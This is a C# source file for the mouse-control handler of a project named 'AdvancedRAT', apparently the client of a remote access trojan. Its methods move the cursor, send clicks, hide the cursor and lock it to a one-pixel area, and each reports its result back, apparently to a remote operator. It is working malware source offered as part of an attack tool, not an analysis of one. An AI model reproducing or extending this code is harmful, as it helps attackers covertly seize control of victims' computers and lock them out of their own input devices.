using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace AdvancedRAT.Client.Handlers
{
    public class MouseHandler
    {
        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int X, int Y);
        
        [DllImport("user32.dll")]
        private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
        
        [DllImport("user32.dll")]
        private static extern bool ShowCursor(bool bShow);
        
        [DllImport("user32.dll")]
        private static extern bool ClipCursor(ref RECT lpRect);
        
        [DllImport("user32.dll")]
        private static extern bool ClipCursor(IntPtr lpRect);
        
        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }
        
        private const uint MOUSEEVENTF_LEFTDOWN = 0x02;
        private const uint MOUSEEVENTF_LEFTUP = 0x04;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const uint MOUSEEVENTF_RIGHTUP = 0x10;
        private const uint MOUSEEVENTF_MIDDLEDOWN = 0x20;
        private const uint MOUSEEVENTF_MIDDLEUP = 0x40;
        
        public async Task<object> MoveMouse(int x, int y)
        {
            try
            {
                SetCursorPos(x, y);
                return new { success = true, message = $"Mouse moved to ({x}, {y})" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Click()
        {
            try
            {
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                await Task.Delay(50);
                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                
                return new { success = true, message = "Mouse clicked" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> RightClick()
        {
            try
            {
                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                await Task.Delay(50);
                mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                
                return new { success = true, message = "Mouse right clicked" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> DoubleClick()
        {
            try
            {
                await Click();
                await Task.Delay(100);
                await Click();
                
                return new { success = true, message = "Mouse double clicked" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Hide()
        {
            try
            {
                ShowCursor(false);
                return new { success = true, message = "Mouse cursor hidden" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Show()
        {
            try
            {
                ShowCursor(true);
                return new { success = true, message = "Mouse cursor shown" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Lock()
        {
            try
            {
                RECT rect = new RECT { Left = 0, Top = 0, Right = 1, Bottom = 1 };
                ClipCursor(ref rect);
                
                return new { success = true, message = "Mouse locked" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Unlock()
        {
            try
            {
                ClipCursor(IntPtr.Zero);
                return new { success = true, message = "Mouse unlocked" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
    }
}
